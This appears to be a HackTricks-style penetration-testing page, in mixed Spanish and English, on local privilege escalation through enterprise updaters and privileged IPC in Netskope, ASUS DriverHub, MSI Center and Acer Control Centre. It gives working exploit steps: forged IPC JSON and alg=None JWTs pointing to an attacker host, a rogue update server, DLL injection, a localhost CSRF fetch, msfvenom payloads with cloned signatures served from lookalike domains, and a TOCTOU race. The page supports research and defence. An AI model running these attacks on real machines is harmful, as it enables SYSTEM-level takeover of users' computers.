# Abuso de auto-updaters empresariales e IPC privilegiado (e.g., Netskope, ASUS & MSI)

{{#include ../../banners/hacktricks-training.md}}

Esta página generaliza una clase de cadenas de escalada de privilegios locales en Windows que se encuentran en agentes de endpoint y actualizadores empresariales que exponen una superficie IPC low\-friction y un flujo de actualización privilegiado. Un ejemplo representativo es Netskope Client for Windows < R129 (CVE-2025-0309), donde un usuario low\-privileged puede forzar la inscripción en un servidor attacker\-controlled y luego entregar un MSI malicioso que instala el servicio SYSTEM.

Ideas clave que puedes reutilizar contra productos similares:
- Abusar del IPC localhost de un servicio privilegiado para forzar re\-enrollment o reconfiguración hacia un servidor atacante.
- Implementar los endpoints de update del vendor, entregar un Trusted Root CA malicioso y apuntar el updater a un paquete malicioso “signed”.
- Evadir comprobaciones de signer débiles (CN allow\-lists), flags de digest opcionales y propiedades MSI laxas.
- Si el IPC está “encrypted”, derivar la key/IV de identificadores de máquina world\-readable almacenados en el registry.
- Si el servicio restringe a los llamantes por image path/process name, inyectar en un proceso allow\-listed o spawn uno en estado suspended y bootstrap tu DLL vía un parche mínimo al thread\-context.

---
## 1) Forzar la inscripción en un servidor atacante vía localhost IPC

Muchos agentes incluyen un proceso UI en user\-mode que se comunica con un servicio SYSTEM sobre localhost TCP usando JSON.

Observado en Netskope:
- UI: stAgentUI (low integrity) ↔ Service: stAgentSvc (SYSTEM)
- IPC command ID 148: IDP_USER_PROVISIONING_WITH_TOKEN

Flujo del exploit:
1) Construye un JWT enrollment token cuyos claims controlen el backend host (p. ej., AddonUrl). Usa alg=None para que no se requiera firma.
2) Envía el mensaje IPC invocando el comando de provisioning con tu JWT y el nombre del tenant:
```json
{
"148": {
"idpTokenValue": "<JWT with AddonUrl=attacker-host; header alg=None>",
"tenantName": "TestOrg"
}
}
```
3) El servicio comienza a contactar tu servidor malicioso para enrollment/config, p. ej.:
- /v1/externalhost?service=enrollment
- /config/user/getbrandingbyemail

Notes:
- Si la verificación del caller es path/name\-based, origina la solicitud desde un binario de vendor allow\-listed (ver §4).

---
## 2) Secuestrar el canal de actualización para ejecutar código como SYSTEM

Una vez que el cliente hable con tu servidor, implementa los endpoints esperados y redirígelo a un MSI atacante. Secuencia típica:

1) /v2/config/org/clientconfig → Devuelve una configuración JSON con un intervalo de actualización muy corto, p. ej.:
```json
{
"clientUpdate": { "updateIntervalInMin": 1 },
"check_msi_digest": false
}
```
2) /config/ca/cert → Devuelve un PEM CA certificate. El servicio lo instala en el Local Machine Trusted Root store.
3) /v2/checkupdate → Suministra metadatos que apuntan a un MSI malicioso y a una versión falsa.

Bypassing common checks seen in the wild:
- Signer CN allow\-list: el servicio puede únicamente comprobar que el Subject CN sea “netSkope Inc” o “Netskope, Inc.”. Tu rogue CA puede emitir un leaf con ese CN y firmar el MSI.
- CERT_DIGEST property: incluye una propiedad MSI benigna llamada CERT_DIGEST. No hay enforcement en la instalación.
- Optional digest enforcement: un flag de configuración (p.ej., check_msi_digest=false) deshabilita la validación criptográfica extra.

Result: el servicio SYSTEM instala tu MSI desde
C:\ProgramData\Netskope\stAgent\data\*.msi
ejecutando código arbitrario como NT AUTHORITY\SYSTEM.

---
## 3) Forging encrypted IPC requests (when present)

From R127, Netskope envolvía el IPC JSON en un campo encryptData que parece Base64. El reversing mostró AES con key/IV derivados de valores del registro legibles por cualquier usuario:
- Key = HKLM\SOFTWARE\NetSkope\Provisioning\nsdeviceidnew
- IV  = HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProductID

Los atacantes pueden reproducir el cifrado y enviar comandos cifrados válidos desde un usuario estándar. Consejo general: si un agente de repente “encrypts” su IPC, busca device IDs, product GUIDs, install IDs bajo HKLM como material.

---
## 4) Bypassing IPC caller allow\-lists (path/name checks)

Algunos servicios intentan autenticar al peer resolviendo el PID de la conexión TCP y comparando la ruta/nombre de la imagen contra binarios de vendor allow\-listed ubicados bajo Program Files (p.ej., stagentui.exe, bwansvc.exe, epdlp.exe).

Dos bypasses prácticos:
- DLL injection en un proceso allow\-listed (p.ej., nsdiag.exe) y proxy del IPC desde dentro de él.
- Spawn de un binario allow\-listed en estado suspended e bootstrap de tu proxy DLL sin CreateRemoteThread (see §5) para satisfacer las reglas de tampering impuestas por el driver.

---
## 5) Tamper\-protection friendly injection: suspended process + NtContinue patch

Los productos a menudo incluyen un minifilter/OB callbacks driver (p.ej., Stadrv) para quitar derechos peligrosos de los handles hacia procesos protegidos:
- Process: elimina PROCESS_TERMINATE, PROCESS_CREATE_THREAD, PROCESS_VM_READ, PROCESS_DUP_HANDLE, PROCESS_SUSPEND_RESUME
- Thread: restringe a THREAD_GET_CONTEXT, THREAD_QUERY_LIMITED_INFORMATION, THREAD_RESUME, SYNCHRONIZE

Un loader en user\-mode fiable que respeta estas restricciones:
1) CreateProcess de un binario del vendor con CREATE_SUSPENDED.
2) Obtén handles que aún se te permitan: PROCESS_VM_WRITE | PROCESS_VM_OPERATION sobre el proceso, y un handle de hilo con THREAD_GET_CONTEXT/THREAD_SET_CONTEXT (o solo THREAD_RESUME si parcheas código en un RIP conocido).
3) Sobrescribe ntdll!NtContinue (u otro thunk temprano y garantizado mapeado) con un pequeño stub que llame a LoadLibraryW sobre la ruta de tu DLL, luego haga jump de regreso.
4) ResumeThread para disparar tu stub en\-process, cargando tu DLL.

Porque nunca usaste PROCESS_CREATE_THREAD o PROCESS_SUSPEND_RESUME sobre un proceso ya protegido (tú lo creaste), la política del driver queda satisfecha.

---
## 6) Practical tooling
- NachoVPN (Netskope plugin) automatiza una rogue CA, la firma de MSI maliciosos y sirve los endpoints necesarios: /v2/config/org/clientconfig, /config/ca/cert, /v2/checkupdate.
- UpSkope es un cliente IPC custom que construye mensajes IPC arbitrarios (opcionalmente AES\-encrypted) e incluye la inyección por suspended\-process para originar desde un allow\-listed binary.

---
## 1) Browser\-to\-localhost CSRF against privileged HTTP APIs (ASUS DriverHub)

DriverHub incluye un servicio HTTP en user\-mode (ADU.exe) en 127.0.0.1:53000 que espera llamadas del navegador provenientes de https://driverhub.asus.com. El filtro de origin simplemente ejecuta `string_contains(".asus.com")` sobre la cabecera Origin y sobre las URLs de descarga expuestas por `/asus/v1.0/*`. Cualquier host controlado por el atacante como `https://driverhub.asus.com.attacker.tld` por tanto pasa la comprobación y puede emitir peticiones que cambian estado desde JavaScript. See [CSRF basics](../../pentesting-web/csrf-cross-site-request-forgery.md) for additional bypass patterns.

Flujo práctico:
1) Registra un dominio que incluya `.asus.com` y hospeda una página maliciosa allí.
2) Usa `fetch` o XHR para llamar a un endpoint privilegiado (p.ej., `Reboot`, `UpdateApp`) en `http://127.0.0.1:53000`.
3) Envía el JSON body que espera el manejador – el frontend JS empaquetado muestra el esquema abajo.
```javascript
fetch("http://127.0.0.1:53000/asus/v1.0/Reboot", {
method: "POST",
headers: { "Content-Type": "application/json" },
body: JSON.stringify({ Event: [{ Cmd: "Reboot" }] })
});
```
Incluso el PowerShell CLI que se muestra a continuación funciona cuando el encabezado Origin se falsifica al valor confiable:
```powershell
Invoke-WebRequest -Uri "http://127.0.0.1:53000/asus/v1.0/Reboot" -Method Post \
-Headers @{Origin="https://driverhub.asus.com"; "Content-Type"="application/json"} \
-Body (@{Event=@(@{Cmd="Reboot"})}|ConvertTo-Json)
```
Any browser visit to the attacker site therefore becomes a 1\-click (or 0\-click via `onload`) local CSRF that drives a SYSTEM helper.

---
## 2) Verificación insegura de code\-signing y clonación de certificados (ASUS UpdateApp)

`/asus/v1.0/UpdateApp` downloads arbitrary executables defined in the JSON body and caches them in `C:\ProgramData\ASUS\AsusDriverHub\SupportTemp`. La validación de la URL de descarga reutiliza la misma lógica basada en subcadenas, así que `http://updates.asus.com.attacker.tld:8000/payload.exe` es aceptada. Después de la descarga, ADU.exe únicamente comprueba que el PE contiene una firma y que la cadena Subject coincide con ASUS antes de ejecutarlo – no `WinVerifyTrust`, no validación de cadena.

Para weaponizar el flujo:
1) Create a payload (e.g., `msfvenom -p windows/exec CMD=notepad.exe -f exe -o payload.exe`).
2) Clone ASUS’s signer into it (e.g., `python sigthief.py -i ASUS-DriverHub-Installer.exe -t payload.exe -o pwn.exe`).
3) Host `pwn.exe` on a `.asus.com` lookalike domain and trigger UpdateApp via the browser CSRF above.

Porque tanto los filtros Origin como URL se basan en subcadenas y la comprobación del signer solo compara cadenas, DriverHub descarga y ejecuta el binario del atacante bajo su contexto elevado.

---
## 1) TOCTOU inside updater copy/execute paths (MSI Center CMD_AutoUpdateSDK)

El servicio SYSTEM de MSI Center expone un protocolo TCP donde cada frame es `4-byte ComponentID || 8-byte CommandID || ASCII arguments`. El componente principal (Component ID `0f 27 00 00`) incluye `CMD_AutoUpdateSDK = {05 03 01 08 FF FF FF FC}`. Su manejador:
1) Copies the supplied executable to `C:\Windows\Temp\MSI Center SDK.exe`.
2) Verifies the signature via `CS_CommonAPI.EX_CA::Verify` (certificate subject must equal “MICRO-STAR INTERNATIONAL CO., LTD.” and `WinVerifyTrust` succeeds).
3) Creates a scheduled task that runs the temp file as SYSTEM with attacker\-controlled arguments.

El archivo copiado no queda bloqueado entre la verificación y `ExecuteTask()`. Un atacante puede:
- Send Frame A pointing to a legitimate MSI-signed binary (guarantees the signature check passes and the task is queued).
- Race it with repeated Frame B messages that point to a malicious payload, overwriting `MSI Center SDK.exe` just after verification completes.

Cuando el scheduler se dispara, ejecuta el payload sobrescrito bajo SYSTEM a pesar de haber validado el archivo original. La explotación fiable usa dos goroutines/threads que spamean CMD_AutoUpdateSDK hasta ganar la ventana TOCTOU.

---
## 2) Abusing custom SYSTEM-level IPC & impersonation (MSI Center + Acer Control Centre)

### MSI Center TCP command sets
- Every plugin/DLL loaded by `MSI.CentralServer.exe` receives a Component ID stored under `HKLM\SOFTWARE\MSI\MSI_CentralServer`. Los primeros 4 bytes de un frame seleccionan ese componente, permitiendo a atacantes enrutar comandos a módulos arbitrarios.
- Plugins can define their own task runners. `Support\API_Support.dll` exposes `CMD_Common_RunAMDVbFlashSetup = {05 03 01 08 01 00 03 03}` and directly calls `API_Support.EX_Task::ExecuteTask()` with **no signature validation** – cualquier usuario local puede apuntarlo a `C:\Users\<user>\Desktop\payload.exe` y obtener ejecución SYSTEM de forma determinista.
- Sniffing loopback with Wireshark or instrumenting the .NET binaries in dnSpy quickly reveals the Component ↔ command mapping; custom Go/ Python clients can then replay frames.

### Acer Control Centre named pipes & impersonation levels
- `ACCSvc.exe` (SYSTEM) exposes `\\.\pipe\treadstone_service_LightMode`, y su ACL discrecional permite clientes remotos (p.ej., `\\TARGET\pipe\treadstone_service_LightMode`). Enviar el ID de comando `7` con una ruta de archivo invoca la rutina de creación de procesos del servicio.
- The client library serializes a magic terminator byte (113) along with args. Instrumentación dinámica con Frida/`TsDotNetLib` (ver [Reversing Tools & Basic Methods](../../reversing/reversing-tools-basic-methods/README.md) para consejos de instrumentación) muestra que el manejador nativo mapea este valor a un `SECURITY_IMPERSONATION_LEVEL` y un integrity SID antes de llamar a `CreateProcessAsUser`.
- Swapping 113 (`0x71`) for 114 (`0x72`) drops into the generic branch that keeps the full SYSTEM token and sets a high-integrity SID (`S-1-16-12288`). El binario lanzado por tanto corre como SYSTEM sin restricciones, tanto localmente como entre máquinas.
- Combine that with the exposed installer flag (`Setup.exe -nocheck`) to stand up ACC even on lab VMs and exercise the pipe without vendor hardware.

Estos bugs de IPC subrayan por qué los servicios localhost deben imponer autenticación mutua (ALPC SIDs, `ImpersonationLevel=Impersonation` filters, token filtering) y por qué el helper de cada módulo que “run arbitrary binary” debe compartir las mismas comprobaciones del signer.

---
## References
- [Advisory – Netskope Client for Windows – Local Privilege Escalation via Rogue Server (CVE-2025-0309)](https://blog.amberwolf.com/blog/2025/august/advisory---netskope-client-for-windows---local-privilege-escalation-via-rogue-server/)
- [NachoVPN – Netskope plugin](https://github.com/AmberWolfCyber/NachoVPN)
- [UpSkope – Netskope IPC client/exploit](https://github.com/AmberWolfCyber/UpSkope)
- [NVD – CVE-2025-0309](https://nvd.nist.gov/vuln/detail/CVE-2025-0309)
- [SensePost – Pwning ASUS DriverHub, MSI Center, Acer Control Centre and Razer Synapse 4](https://sensepost.com/blog/2025/pwning-asus-driverhub-msi-center-acer-control-centre-and-razer-synapse-4/)
- [sensepost/bloatware-pwn PoCs](https://github.com/sensepost/bloatware-pwn)

{{#include ../../banners/hacktricks-training.md}}
